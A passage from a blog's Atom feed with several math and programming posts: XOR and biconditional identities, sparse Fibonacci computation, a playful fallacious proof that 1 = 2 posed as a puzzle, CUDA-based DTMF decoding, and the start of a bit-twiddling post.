src="/assets/jupyter/MarkusThill.github.io-jupyter/2024_12_16_pe_200p58.ipynb.html" style="position: absolute; top: 0; left: 0; border-style: none;" width="100%" height="100%" onload="this.parentElement.style.paddingBottom = (this.contentWindow.document.documentElement.scrollHeight + 10) + 'px'"></iframe> </div> </div> </div>]]></content><author><name></name></author><category term="math"/><category term="fibonacci"/><category term="sequences"/><summary type="html"><![CDATA[Lagged Fibonacci Generators (LFGs) are powerful tools for generating pseudo-random sequences in simulations and cryptography. While traditional implementations become inefficient when computing sparse terms at large indices, this blog explores an optimized approach using matrix exponentiation and modular arithmetic. By encoding the recurrence relation in a transformation matrix and leveraging GPU acceleration, the method achieves scalability and speed, making it ideal for large-scale applications.]]></summary></entry><entry><title type="html">Some Interesting Properties of the Exclusive Or (XOR)</title><link href="https://markusthill.github.io/blog/2024/a-few-properties-of-the-exclusive-or/" rel="alternate" type="text/html" title="Some Interesting Properties of the Exclusive Or (XOR)"/><published>2024-12-13T08:16:00+00:00</published><updated>2024-12-13T08:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/a-few-properties-of-the-exclusive-or</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/a-few-properties-of-the-exclusive-or/"><![CDATA[<p>The exclusive-OR – sometimes also exclusive disjunction (short: XOR) or antivalence – is a boolean operation which only outputs true if only exactly one of its both inputs is true (so if both inputs differ). There are many applications where the XOR is used, for instance in cryptography, gray codes, parity and CRC checks and certainly many more. Commonly, the \(\oplus\) symbol is used to denote the XOR operation. Here, we will use the \(\nleftrightarrow\) symbol for the Exclusive-OR and \(\leftrightarrow\) for its negation, the biconditional operator. In this blog post we will look at a few of its interesting properties which can be useful.</p> <p>Let us start with the truth table of the Exclusive-OR (\(\nleftrightarrow\)) and the biconditional:</p> <table> <thead> <tr> <th style="text-align: right">a</th> <th style="text-align: center">b</th> <th style="text-align: center">a \(\nleftrightarrow\) b</th> <th style="text-align: left">a \(\leftrightarrow\) b</th> </tr> </thead> <tbody> <tr> <td style="text-align: right">0</td> <td style="text-align: center">0</td> <td style="text-align: center">0</td> <td style="text-align: left">1</td> </tr> <tr> <td style="text-align: right">0</td> <td style="text-align: center">1</td> <td style="text-align: center">1</td> <td style="text-align: left">0</td> </tr> <tr> <td style="text-align: right">1</td> <td style="text-align: center">0</td> <td style="text-align: center">1</td> <td style="text-align: left">0</td> </tr> <tr> <td style="text-align: right">1</td> <td style="text-align: center">1</td> <td style="text-align: center">0</td> <td style="text-align: left">1</td> </tr> </tbody> </table> <h3 id="definition">Definition</h3> <p>From this table we can extract the following equations, which is the most commonly used definition of the XOR operation:</p> \[\begin{align} a \nleftrightarrow b = \bar a b \vee a \bar b \quad \mbox{and} \quad a \leftrightarrow b = \bar a \bar b \vee a b \label{eq:definition} \end{align}\] <h3 id="inverse-element">Inverse Element</h3> <p>Note that the logical AND operation (\(a \wedge b\)) is written as \(ab\). Both operations have an inverse element (1 and 0) so that</p> \[\begin{align} a \nleftrightarrow 1 = \bar a \quad \mbox{and} \quad a \leftrightarrow 0 = \bar a \\ a \nleftrightarrow \bar a = 1 \quad \mbox{and} \quad a \leftrightarrow \bar a = 0 \end{align}\] <h3 id="neutral-element">Neutral Element</h3> <p>For the Exclusive-OR and the biconditional also a neutral element exists (0 and 1):</p> \[\begin{align} a \nleftrightarrow 0 = a \quad \mbox{and} \quad a \leftrightarrow 1 = a \\ \end{align}\] <h3 id="idempotency">Idempotency</h3> <p>It can easily be shown that the the XOR does not fulfil the idempotency property, which states that for any operation \(\circ\) we have \(a \circ a = a\). From the truth table we can see that</p> <p>\(\begin{align} a \nleftrightarrow a = 0 \quad \mbox{and} \quad a \leftrightarrow a = 1. \\ \end{align}\).</p> <h3 id="inverse-of-the-exclusive-or">Inverse of the Exclusive OR</h3> <p>We have already mentioned that the inverse of the XOR is the biconditional operator. This can also be easily seen from the truth table. However, it is also possible to show this formally:</p> \[\begin{align} a \nleftrightarrow b = \overline{a \leftrightarrow b} \quad \mbox{and} \quad a \leftrightarrow b = \overline{a \nleftrightarrow b} \label{eq:inverseXOR} \end{align}\] <p>since – using Eq. \eqref{eq:definition} :</p> \[\begin{align*} &amp; a \nleftrightarrow b = \bar a b \vee a \bar b = \overline{ \overline{\bar a b} \wedge \overline{a \bar b}} = \overline{(a \vee \bar b) \wedge (\bar a \vee b)} \\ &amp;= \overline{a(\bar a \vee b) \vee \bar b (\bar a \vee b)} = \overline{ab \vee \bar a \bar b}\\ &amp;= \overline{a \leftrightarrow b} \end{align*}\] <h3 id="commutativity">Commutativity</h3> <p>Commutativity is given in both cases as well:</p> \[\begin{align} a \nleftrightarrow b = b \nleftrightarrow a \quad \mbox{and} \quad a \leftrightarrow b = b \leftrightarrow a \label{eq:Commutativity} \end{align}\] <p>since</p> \[\begin{align} a \nleftrightarrow b = \bar a b \vee a \bar b = \bar b a \vee b \bar a = b \nleftrightarrow a \quad (\mbox{analogously for} \leftrightarrow )\\ \end{align}\] <h3 id="associativity">Associativity</h3> <p>Also the associative property is fulfilled:</p> \[\begin{align} a \nleftrightarrow b \nleftrightarrow c = (a \nleftrightarrow b) \nleftrightarrow c = a \nleftrightarrow (b \nleftrightarrow c) \\ a \leftrightarrow b \leftrightarrow c = (a \leftrightarrow b) \leftrightarrow c = a \leftrightarrow (b \leftrightarrow c) \\ \end{align}\] <p>since – using rules \eqref{eq:definition} and \eqref{eq:inverseXOR}.</p> \[\begin{align*} &amp; a \nleftrightarrow (b \nleftrightarrow c) = a \nleftrightarrow (\bar b c \vee b \bar c) = \bar a (\bar b c \vee b \bar c) \vee a \overline{\bar b c \vee b \bar c} \\ &amp;= \bar a \bar b c \vee \bar a b \bar c \vee a( b \vee \bar c) (\bar b \vee c) = \bar a \bar b c \vee \bar a b \bar c \vee abc \vee a \bar b \bar c \\ &amp;= (ab \vee \bar a \bar b)c \vee (\bar a b \vee a \bar b)\bar c = \overline{a \nleftrightarrow b} c \vee (a \nleftrightarrow b) \bar c \\ &amp;= (a \nleftrightarrow b) \nleftrightarrow c = a \nleftrightarrow b \nleftrightarrow c \end{align*}\] <h3 id="distributivity">Distributivity</h3> <p>As we will see later, the conjunction (AND) and Exclusive-OR (biconditional) represent the multiplication and addition operations of a Galois field GF(2), and in such a field they follow the distributive law:</p> \[\begin{align} a(b \nleftrightarrow c) = ab \nleftrightarrow ac \quad \mbox{and} \quad a(b \leftrightarrow c) = ab \leftrightarrow ac \end{align}\] <p>since – with Eq. \eqref{eq:inverseXOR}:</p> \[\begin{align*} a(b \nleftrightarrow c) &amp;\overset{!}{=} ab \nleftrightarrow ac \\ a( b \bar c \vee \bar b c) &amp;\overset{!}{=} ab \overline{ac} \vee \overline{ab} bc \\ a b \bar c \vee a \bar b c &amp;\overset{!}{=} ab (\bar a \vee \bar c) \vee (\bar a \vee \bar b) ac \\ a b \bar c \vee a \bar b c &amp;= ab \bar c \vee a \bar b c \end{align*}\] <p>This holds accordingly for the biconditional operator.</p> <h3 id="inverting-a-single-operand">Inverting a single Operand</h3> \[\begin{align} \bar a \nleftrightarrow b = \overline{a \nleftrightarrow b} \quad \mbox{and} \quad \bar a \leftrightarrow b = \overline{a \leftrightarrow b} \label{eq:invOne} \end{align}\] <p>since – with Eq. \eqref{eq:inverseXOR}:</p> \[\begin{align*} \bar a \nleftrightarrow b = ab \vee \bar a \bar b = a \leftrightarrow b = \overline{a \nleftrightarrow b}. \end{align*}\] <h3 id="inverting-both-operands">Inverting both Operands</h3> \[\begin{align} \bar a \nleftrightarrow \bar b = a \nleftrightarrow b \quad \mbox{and} \quad \bar a \leftrightarrow \bar b = a \leftrightarrow b \label{eq:invBoth} \end{align}\] <p>which can be shown trivially with \eqref{eq:definition}:</p> \[\begin{align*} \bar a \nleftrightarrow \bar b = a \bar b \vee \bar a b = a \nleftrightarrow b \\ \end{align*}\] <h3 id="expressing-the-logical-or-in-terms-of-the-exclusive-or">Expressing the Logical OR in Terms of the Exclusive-OR</h3> <p>We can find the following expression:</p> \[\begin{align} a \vee b = (a \nleftrightarrow b) \vee ab \label{eq:OR-XOR} \end{align}\] <p>since – by expanding a and b, with \((ab \vee a\bar b) = a(b \vee \bar b) = a\):</p> \[\begin{align*} a\vee b &amp;= (ab \vee a\bar b) \vee (ab \vee \bar a b) = \bar a b \vee a \bar b \vee ab \\ &amp;= (a \nleftrightarrow b) \vee ab \end{align*}\] <p>Since the above equation again contains a disjunction (OR), this does not appear like any improvement, however, this rule can be helpful in deriving many other relations. For example, let us apply the rule \eqref{eq:OR-XOR} to itself:</p> <p>Let us first identify:</p> \[\begin{align*} A &amp;= a \nleftrightarrow b \\ B &amp;= ab \end{align*}\] <p>Then we have (inserting the original expressions for \(A\) and \(B\) after some time again):</p> \[\begin{align*} A \vee B &amp;= (A \nleftrightarrow B) \vee AB \\ &amp;= (A \nleftrightarrow B) \vee (a \nleftrightarrow b)ab \\ &amp;= (A \nleftrightarrow B) \vee (\bar a b \vee a \bar b)ab \\ \end{align*}\] <p>Since the terms \(\bar a b\) and \(a \bar b\) are disjunct to \(ab\), the above expression simplifys to:</p> \[\begin{align*} (A \nleftrightarrow B) \vee (\bar a b \vee a \bar b)ab &amp;= A \nleftrightarrow B \\ \end{align*}\] <p>This leads finally to some interesting relation:</p> \[\begin{align} a \vee b &amp;= (a \nleftrightarrow b) \vee ab \nonumber\\ &amp;= A \nleftrightarrow B \\ &amp;= a \nleftrightarrow b \nleftrightarrow ab \nonumber \end{align}\] <h3 id="expressing-the-logical-and-in-terms-of-the-exclusive-or">Expressing the Logical AND in Terms of the Exclusive-OR</h3> <p>Analogously to the previous paragraph, one can derive some interesting relations for the logical AND (conjunction):</p> \[\begin{align} a \wedge b = (a \leftrightarrow b) \wedge (a \vee b) \end{align}\] <p>and</p> \[\begin{align} a \wedge b = a \leftrightarrow b \leftrightarrow (a \vee b) \end{align}\] <h3 id="the-logical-or-of-pairwise-disjunct-terms">The Logical OR of pairwise disjunct Terms</h3> <p>Using the rule \eqref{eq:OR-XOR} we can find another interesting relation for disjunctive forms where all terms are pairwise disjunct. Consider the following easy example – applying rule \eqref{eq:OR-XOR}:</p> \[\begin{align} \bar a b\vee a \bar b &amp;= (\bar a b \nleftrightarrow a \bar b) \vee (\bar a b\wedge a \bar b) \nonumber \\ &amp;= \bar a b \nleftrightarrow a \bar b \label{eq:xorAbsurdum} \end{align}\] <p>As a side note, we can also write above relation backwards, so that:</p> \[\begin{align} \bar a b \nleftrightarrow a \bar b &amp;= \bar a b\vee a \bar b \nonumber \\ &amp;= a \nleftrightarrow b \end{align}\] <p>With Eq.\eqref{eq:xorAbsurdum} we have an important relation that states that all OR operations in an disjunctive form can be simply replaced with an XOR, if all terms are pairwise disjunct. For example, the rule can be applied to the following disjunctive form:</p> \[\begin{align*} abc \vee \bar a bc \vee ab \bar c \\ = abc \nleftrightarrow \bar a bc \nleftrightarrow ab \bar c. \end{align*}\] <h3 id="the-logical-biconditional-and-exclusive-or-revisited">The Logical Biconditional and Exclusive-OR revisited</h3> <p>Sometimes it is possible to replace all biconditional operations in an equation by Exclusive-ORs. Consider the following example – with Eq. \eqref{eq:inverseXOR} and Eq. \eqref{eq:invOne}:</p> \[\begin{align*} a \leftrightarrow b \leftrightarrow c &amp;= \overline{a \nleftrightarrow b} \leftrightarrow c \\ &amp;= \overline{(a \nleftrightarrow b) \leftrightarrow c} \\ &amp;= a \nleftrightarrow b \nleftrightarrow c. \end{align*}\] <p>Or, in short:</p> \[\begin{align} a \leftrightarrow b \leftrightarrow c &amp;= a \nleftrightarrow b \nleftrightarrow c. \label{eq:BicondEqXOR} \end{align}\] <h3 id="the-combined-associative-property-of-the-logical-biconditional-and-the-exclusive-or">The combined Associative Property of the Logical Biconditional and the Exclusive-OR</h3> <p>Similarly to before, where we showed the associative property of the biconditional and the exclusive-OR for both cases separately, we can also show that the associative property also holds for mixed terms – with Eq.\eqref{eq:inverseXOR}, \eqref{eq:invOne} and \eqref{eq:BicondEqXOR}:</p> \[\begin{align*} (a \nleftrightarrow b) \leftrightarrow c &amp;\overset{!}{=} a \nleftrightarrow (b \leftrightarrow c) \\ \overline{a \leftrightarrow b} \leftrightarrow c &amp;\overset{!}{=} a \nleftrightarrow \overline{b \nleftrightarrow c} \\ \overline{a \leftrightarrow b \leftrightarrow c} &amp;\overset{!}{=} \overline{a \nleftrightarrow b \nleftrightarrow c} \\ a \leftrightarrow b \leftrightarrow c &amp;= a \nleftrightarrow b \nleftrightarrow c \\ \end{align*}\] <p>This allows us to state: \(\begin{align} (a \nleftrightarrow b) \leftrightarrow c = a \nleftrightarrow (b \leftrightarrow c) = a \nleftrightarrow b \leftrightarrow c \label{eq:mixedassociative} \end{align}\)</p> <h3 id="the-combined-commutative-property-of-the-logical-biconditional-and-the-exclusive-or">The combined Commutative Property of the Logical Biconditional and the Exclusive-OR</h3> <p>After we showed the combined associative property of the logical biconditional and the exclusive-OR, we accordingly show commutativity. We only need Eq. \eqref{eq:Commutativity} and \eqref{eq:mixedassociative}. The argumentation is then rather trivial:</p> \[\begin{align*} &amp;a \nleftrightarrow b \leftrightarrow c = (a \nleftrightarrow b) \leftrightarrow c = (b \nleftrightarrow a) \leftrightarrow c \\ = &amp;b \nleftrightarrow a \leftrightarrow c = b \nleftrightarrow (a \leftrightarrow c) = b \nleftrightarrow (c \leftrightarrow a) \\ = &amp;b \nleftrightarrow c \leftrightarrow a = (b \nleftrightarrow c) \leftrightarrow a = (c \nleftrightarrow b) \leftrightarrow a \\ = &amp; c \nleftrightarrow b \leftrightarrow a = \cdots \\ = &amp;a \nleftrightarrow b \leftrightarrow c = (a \nleftrightarrow b) \leftrightarrow c = c \leftrightarrow (a \nleftrightarrow b) \\ = &amp; c \leftrightarrow a \nleftrightarrow b = (c \leftrightarrow a) \nleftrightarrow b = b \nleftrightarrow (c \leftrightarrow a) \\ = &amp; b \nleftrightarrow c \leftrightarrow a = (b \nleftrightarrow c) \leftrightarrow a = a \leftrightarrow (b \nleftrightarrow c) \\ = &amp; a \leftrightarrow b \nleftrightarrow c = \cdots \end{align*}\] <p>In summary, we can write:</p> \[\begin{align} a \nleftrightarrow b \leftrightarrow c = b \nleftrightarrow a \leftrightarrow c = b \nleftrightarrow c \leftrightarrow a = c \nleftrightarrow b \leftrightarrow a = \cdots \nonumber \\ = c \leftrightarrow a \nleftrightarrow b = b \nleftrightarrow c \leftrightarrow a = a \leftrightarrow b \nleftrightarrow c = \cdots \label{eq:combinedCommutative} \end{align}\] <p>Hence, all terms in an mixed expression of XORs and biconditionals are pairwise interchangeable. This is a very important observation which can often help in practice.</p> <h3 id="replacing-exclusive-or-operations-in-an-expression-with-biconditionals">Replacing Exclusive-Or Operations in an Expression with Biconditionals</h3> <p>Assume, we have an expression in the form</p> \[\begin{align*} f(x_1, x_2, \ldots, x_n) = x_1 \nleftrightarrow x_2 \nleftrightarrow \ldots \nleftrightarrow x_n. \end{align*}\] <p>We want to replace all \(\nleftrightarrow\) operations with \(\leftrightarrow\). How can we achieve this? Actually, it is not that difficult. We can recursively apply the rules \eqref{eq:inverseXOR}, \eqref{eq:invOne} and \eqref{eq:mixedassociative} in the following way:</p> \[\begin{align*} f(x_1, x_2, \ldots, x_n) &amp;= \overline{x_1 \leftrightarrow (x_2 \nleftrightarrow x_3 \nleftrightarrow \ldots \nleftrightarrow x_n)} \\ &amp;= \overline{x_1 \leftrightarrow x_2 \nleftrightarrow x_3 \nleftrightarrow \ldots \nleftrightarrow x_n} \\ &amp;= \overline{x_1 \leftrightarrow \overline{x_2 \leftrightarrow (x_3 \nleftrightarrow \ldots \nleftrightarrow x_n)}} \\ &amp;= \overline{x_1 \leftrightarrow \overline{x_2 \leftrightarrow x_3 \nleftrightarrow \ldots \nleftrightarrow x_n}} \\ &amp;= \overline{ \overline{x_1 \leftrightarrow x_2 \leftrightarrow x_3 \nleftrightarrow \ldots \nleftrightarrow x_n}} \\ &amp;= x_1 \leftrightarrow x_2 \leftrightarrow x_3 \nleftrightarrow \ldots \nleftrightarrow x_n \\ &amp;= x_1 \leftrightarrow x_2 \leftrightarrow x_3 \leftrightarrow \overline{\ldots \nleftrightarrow x_n} \\ &amp;= \cdots \end{align*}\] <p>You can see where this is going: After replacing the first XOR we had a negation in the expression which vanished again after replacing the second XOR and then came back with the replacement of the third XOR. So, depending on the number of variables \(n\), we either have a negation left in the end or not. This can be expressed with:</p> \[\begin{align} f(x_1, x_2, \ldots, x_n) &amp;= x_1 \nleftrightarrow x_2 \nleftrightarrow \ldots \nleftrightarrow x_n \label{eq:replaceXOR} \\ \nonumber &amp;= \begin{cases} x_1 \leftrightarrow x_2 \leftrightarrow \ldots \leftrightarrow x_n,&amp; \text{if n is odd} \\ \nonumber \\ \overline{x_1 \leftrightarrow x_2 \leftrightarrow \ldots \leftrightarrow x_n},&amp; \text{if n is even} \end{cases}\\ \end{align}\] <p>Similarly, we find the following relation when we replace the biconditionals in an expression with the XOR operation:</p> \[\begin{align} f(x_1, x_2, \ldots, x_n) &amp;= x_1 \leftrightarrow x_2 \leftrightarrow \ldots \leftrightarrow x_n \label{eq:replaceBiconditional} \\ \nonumber &amp;= \begin{cases} x_1 \nleftrightarrow x_2 \nleftrightarrow \ldots \nleftrightarrow x_n,&amp; \text{if n is odd} \\ \nonumber \\ \overline{x_1 \nleftrightarrow x_2 \nleftrightarrow \ldots \nleftrightarrow x_n},&amp; \text{if n is even} \end{cases}\\ \end{align}\] <h3 id="mixed-representations-of-biconditionals-and-exclusive-ors">Mixed Representations of Biconditionals and Exclusive-ORs</h3> <p>Sometimes, one has mixed representations of biconditionals and exclusive-ORs, which cannot be implemented that efficiently in a digital circuit. In these cases it is possible to find representations consisting solely of XORs or solely of biconditionals. First, we have to bring our original representation in a form:</p> \[f_\nleftrightarrow(x_1,x_2,\ldots,x_m) \circ f_\leftrightarrow(x_{m+1}, x_{m+1}, \ldots, x_n)\] <p>where \(f_\nleftrightarrow\) just consists of XOR operations and \(f_\leftrightarrow\) just consists of biconditionals. For the \(\circ\) symbol, either \(\nleftrightarrow\) is inserted in case we want the final relation to consist of XORs, otherwise \(\leftrightarrow\) is inserted. Note that the above representation with \(f_\nleftrightarrow\) and \(f_\leftrightarrow\) can be easily achieved by simply applying the commutative property from Eq. \eqref{eq:combinedCommutative} to your original relation. Then you are almost done: You just have to apply \eqref{eq:replaceXOR} to \(f_\nleftrightarrow(x_1,x_2,\ldots,x_m)\) or \eqref{eq:replaceBiconditional} to \(f_\leftrightarrow(x_1,x_2,\ldots,x_m)\) – depending which operator you prefer – and finally you have a nice representation containing either just XORs or just biconditionals.</p> <h4 id="example">Example</h4> <p>\(\begin{align*} f(x_1,x_2,x_3,x_4) &amp;= x_1 \leftrightarrow x_2 \nleftrightarrow x_3 \leftrightarrow x_4 \\ &amp;= x_1 \leftrightarrow x_2 \leftrightarrow x_3 \nleftrightarrow x_4 \\ &amp;= f_\leftrightarrow(x_1,x_2,x_3) \nleftrightarrow x_4 \\ \end{align*}\)</p> <p>We replace the biconditionals in \(f_\leftrightarrow\) with XORs:</p> \[\begin{align*} f_\leftrightarrow(x_1,x_2,x_3) &amp;= x_1 \leftrightarrow x_2 \leftrightarrow x_3 \\ &amp;= x_1 \nleftrightarrow x_2 \nleftrightarrow x_3 \end{align*}\] <p>and insert back into the original equation:</p> \[\begin{align*} f(x_1,x_2,x_3,x_4) &amp;= f_\leftrightarrow(x_1,x_2,x_3) \nleftrightarrow x_4 \\ &amp;= x_1 \nleftrightarrow x_2 \nleftrightarrow x_3 \nleftrightarrow x_4 \end{align*}\]]]></content><author><name></name></author><category term="xor"/><category term="boolean algebra"/><category term="digital systems"/><summary type="html"><![CDATA[The exclusive-OR — also known as exclusive disjunction (short: XOR) or antivalence — is a Boolean operation that outputs true only when exactly one of its two inputs is true (i.e., when the inputs differ). XOR has numerous applications, including cryptography, Gray codes, parity checks, and CRC checks, among others. In this blog post, we will explore some of its interesting properties that can be useful in practice.]]></summary></entry><entry><title type="html">Efficient Computation of Sparse Fibonacci Subsequences</title><link href="https://markusthill.github.io/blog/2024/fibo-subsequences/" rel="alternate" type="text/html" title="Efficient Computation of Sparse Fibonacci Subsequences"/><published>2024-12-13T01:16:00+00:00</published><updated>2024-12-13T01:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/fibo-subsequences</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/fibo-subsequences/"><![CDATA[<p>The Fibonacci sequence is defined as:<br/> \(F_0 = 0, \ F_1 = 1,\) and \(F_n = F_{n-1} + F_{n-2}\) for \(n &gt; 1\).</p> <p>The first few elements of the sequence are:<br/> \(0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, \ldots\)</p> <p>Using the classical recurrence relation above, we need to know all preceding elements of the series up to \(n-1\) in order to obtain \(F_n\). For example, to compute \(F_{10} = 55\), we first calculate \(F_9 = 34\) and \(F_8 = 21\), which themselves depend on earlier values in the sequence.</p> <p>Here, we aim to explore the possibility of generating an arbitrary subsequence of the Fibonacci sequence without the need to calculate all preceding terms. For example, we may be interested in computing only \(F_{100}\), \(F_{555}\), \(F_{1000}\), and \(F_{2000}\). Is it possible to compute these specific terms directly, without generating the entire sequence up to \(F_{2000}\)?<br/> As we will see, this is indeed possible.</p> <p>In the example below, we attempt to find one thousand Fibonacci numbers modulo $m$ for every 10th prime number greater than \(10^{15}\):</p> \[S = \{F_{p_{10k}} \bmod m \mid p_{10k} \text{ is the } 10k\text{-th prime number such that } p_{10k} &gt; 10^{15}, \, 0 \leq k &lt; 1000 \}.\] <p>Follow along in the Jupyter notebook below:</p> <style>.jupyter-child-ext{width:112%;position:relative;left:calc(-10%)}</style> <div class="jupyter-child-ext"> <div class="jupyter-notebook" style="position: relative; width: 100%; margin: 0 auto;"> <div class="jupyter-notebook-iframe-container"> <iframe src="/assets/jupyter/MarkusThill.github.io-jupyter/2024_12_14_pe_204p100_fibo_subsequences.ipynb.html" style="position: absolute; top: 0; left: 0; border-style: none;" width="100%" height="100%" onload="this.parentElement.style.paddingBottom = (this.contentWindow.document.documentElement.scrollHeight + 10) + 'px'"></iframe> </div> </div> </div>]]></content><author><name></name></author><category term="math"/><category term="fibonacci"/><category term="sequences"/><summary type="html"><![CDATA[The Fibonacci sequence is a cornerstone of mathematics, defined by its elegant recurrence relation. While traditionally computed iteratively or recursively, obtaining specific terms like the 1000th or 2000th number seems to require calculating all preceding terms. But is this really necessary? In this post, we explore a powerful technique to compute arbitrary Fibonacci terms directly — bypassing the need for sequential computation. We’ll also tackle an exciting challenge: efficiently finding one thousand Fibonacci numbers modulo a given value, corresponding to every 10th prime greater than a trillion.]]></summary></entry><entry><title type="html">Don’t Drink and Derive: A Simple Proof that 1 = 2</title><link href="https://markusthill.github.io/blog/2024/a-simple-proof-that-1-2/" rel="alternate" type="text/html" title="Don’t Drink and Derive: A Simple Proof that 1=2"/><published>2024-12-12T13:16:00+00:00</published><updated>2024-12-12T13:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/a-simple-proof-that-1-2</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/a-simple-proof-that-1-2/"><![CDATA[<p>Let \(\begin{align} a,b,c \in \mathbb{R} \backslash \{ 0\}. \end{align}\)</p> <p>Now let us define a simple equation \(\begin{align} a=b+c \label{eq:start} \end{align}\)</p> <p>and play around with it a little bit.</p> \[\begin{align*} a &amp;= b+c &amp; &amp; \vert\ \cdot a\\ a^2 &amp;= ab + ac &amp; &amp; \vert\ -b^2, -c^2\\ a^2-b^2-c^2 &amp;= ab + ac - b^2 -c^2 &amp; &amp; \vert\ -2bc\\ a^2-b^2-c^2 -2bc &amp;= ab + ac - b^2 -c^2 -2bc &amp; &amp; \\ a^2-b^2-c^2 -2bc &amp;= ab - b^2 - bc + ac - bc - c^2 &amp; &amp; \\ a^2-b^2-c^2 -2bc &amp;= b(a - b - c) + c(a - b - c) &amp; &amp; \\ \end{align*}\] <p>We then add the terms \(ab\) and \(ac\) to the left side of the equation and then subtract them again and rearrange the terms of the equation:</p> \[\begin{align*} a^2-b^2-c^2 -2bc + ab -ab +ac -ac &amp;= b(a - b - c) + c(a - b - c) &amp; &amp; \\ a^2 + ab +ac -ab -b^2 -bc -ac -bc -c^2 &amp;= b(a - b - c) + c(a - b - c) &amp; &amp; \\ (a^2 + ab +ac) - (ab +b^2 +bc) - (ac +bc +c^2) &amp;= b(a - b - c) + c(a - b - c) &amp; &amp; \\ a(a + b +c) - b(a +b + c) - c(a +b +c) &amp;= b(a - b - c) + c(a - b - c) &amp; &amp; \\ (a + b +c) (a-b-c) &amp;= b(a - b - c) + c(a - b - c) &amp; &amp; \vert\ \div (a-b-c)\\ \end{align*}\] <p>Now, the equation simplifies to:</p> \[\begin{align*} a+b+c &amp;= b+c \\ a+ (b+c) &amp;= (b+c) \\ \end{align*}\] <p>If we use our original relation \(a=b+c\) from Eq. \eqref{eq:start} and insert \(a\) for the term \(b+c\) we finally get:</p> \[\begin{align*} a+ a &amp;= a &amp; &amp; \\ 2a &amp;= a &amp; &amp; \vert\ \div a \\ 2 &amp;= 1 \end{align*}\] <p>So, starting with Eq. \eqref{eq:start} we could prove that actually \(1=2\). Or is there something wrong up there?</p>]]></content><author><name></name></author><category term="math"/><summary type="html"><![CDATA[In this blog post, we present a fun little proof that 1 is actually equal to 2. Or is it?]]></summary></entry><entry><title type="html">CUDA Basics: Decoding DTMF Signals</title><link href="https://markusthill.github.io/blog/2024/dtmf-cuda/" rel="alternate" type="text/html" title="CUDA Basics: Decoding DTMF Signals"/><published>2024-12-12T09:16:00+00:00</published><updated>2024-12-12T09:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/dtmf-cuda</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/dtmf-cuda/"><![CDATA[<p>This post explores the fundamentals of CUDA programming using a dual-tone multi-frequency signaling (DTMF) example. Chosen for its manageable complexity and well-defined structure, the example provides an excellent introduction to parallel computing concepts and optimization techniques.</p> <p>DTMF, developed in the 1960s, is a telephone dialing system where each key is represented by the superposition of two harmonic tones. For example, pressing “5” generates frequencies of 770 Hz and 1336 Hz.</p> <p>In this blog post we demonstrate how to:</p> <ul> <li>Generate DTMF dialing sequences using Python (scipy and numpy) and save them as .wav audio files.</li> <li>Design a filter bank of FIR bandpass filters, each isolating one DTMF frequency.</li> <li>Decode the dialed key sequence from the audio file through filtering and post-processing.</li> </ul> <p>A CUDA/C++ implementation (dtmfCuda.cu) is included, showcasing how CUDA can accelerate the decoding process.</p> <h2 id="sample-files">Sample Files</h2> <p>Here are three .wav files containing DTMF signals to help you get started (you will find the files in the GitHub repository listed below). Each file encodes a sequence of telephone keypresses as audio, with each key represented by a unique combination of two frequencies.</p> <p>These files are designed as an introductory example for experimenting with DTMF decoding. You can use them to test your signal processing pipeline, design and evaluate filter banks, or simply gain hands-on experience with DTMF-based signaling.</p> <p>For a fun challenge, try decoding the signals using just your ears and a phone to generate reference sounds! Can you identify the dialed sequence from the characteristic dual-tone sounds? Play the files and give it a try!</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <audio src="/assets/jupyter/DTMFCuda/wav/dial.wav" controls=""/> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <audio src="/assets/jupyter/DTMFCuda/wav/dial2.wav" controls=""/> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <audio src="/assets/jupyter/DTMFCuda/wav/dial3.wav" controls=""/> </figure> </div> </div> <div class="caption"> Three examples of noisy DTMF signals. In this post, we demonstrate how to decode these signals and identify the corresponding telephone keys. </div> <style>.jupyter-child-ext{width:112%;position:relative;left:calc(-10%)}</style> <div class="jupyter-child-ext"> <div class="jupyter-notebook" style="position: relative; width: 100%; margin: 0 auto;"> <div class="jupyter-notebook-iframe-container"> <iframe src="/assets/jupyter/DTMFCuda/dtmf_example.ipynb.html" style="position: absolute; top: 0; left: 0; border-style: none;" width="100%" height="100%" onload="this.parentElement.style.paddingBottom = (this.contentWindow.document.documentElement.scrollHeight + 10) + 'px'"></iframe> </div> </div> </div>]]></content><author><name></name></author><category term="CUDA"/><category term="DTMF"/><category term="DSP"/><category term="FIR"/><category term="code"/><summary type="html"><![CDATA[Discover the fundamentals of CUDA programming through a dual-tone multi-frequency (DTMF) signaling example. Learn how to generate DTMF signals, save them as .wav files, design FIR bandpass filters, and decode dialed keys. This project includes a CUDA/C++ implementation (dtmfCuda.cu) to showcase the power of parallel computing for signal processing.]]></summary></entry><entry><title type="html">A few Bit-Twiddling Tricks</title><link href="https://markusthill.github.io/blog/2024/soa-few-bit-twiddling-tricks/" rel="alternate" type="text/html" title="A few Bit-Twiddling Tricks"/><published>2024-12-11T15:16:00+00:00</published><updated>2024-12-11T15:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/soa-few-bit-twiddling-tricks</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/soa-few-bit-twiddling-tricks/"><![CDATA[<p>When working with bit-fields, there are several techniques that can significantly speed up code — beyond the inherent performance benefits that bit-fields provide for many problems. In this post, I will introduce a few bit-twiddling tricks that I occasionally use, which can be useful for a variety of tasks.</p> <h2 id="swapping-variables-with-the-bitwise-exclusive-or">Swapping Variables with the bitwise Exclusive Or</h2> <p>A very common programming problem is swapping the values of two variables, \(x\) and \(y\). The most common approach is to introduce a temporary variable, \(z\), as follows:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c">  <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">35</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">67</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">z</span><span class="p">;</span>
